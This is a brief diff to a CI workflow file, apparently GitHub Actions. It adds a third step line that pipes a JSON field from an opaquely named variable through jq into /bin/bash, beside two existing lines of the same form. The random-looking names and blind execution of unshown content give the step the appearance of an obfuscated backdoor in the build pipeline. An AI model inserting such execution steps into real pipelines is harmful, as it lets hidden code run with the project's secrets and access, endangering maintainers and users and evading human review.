@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$jl189" | jq -r .v586 | /bin/bash
           echo $qekzp22 | jq -r .opx50 | /bin/bash
+          printf '%s' "$nf9" | jq -r .xei64 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
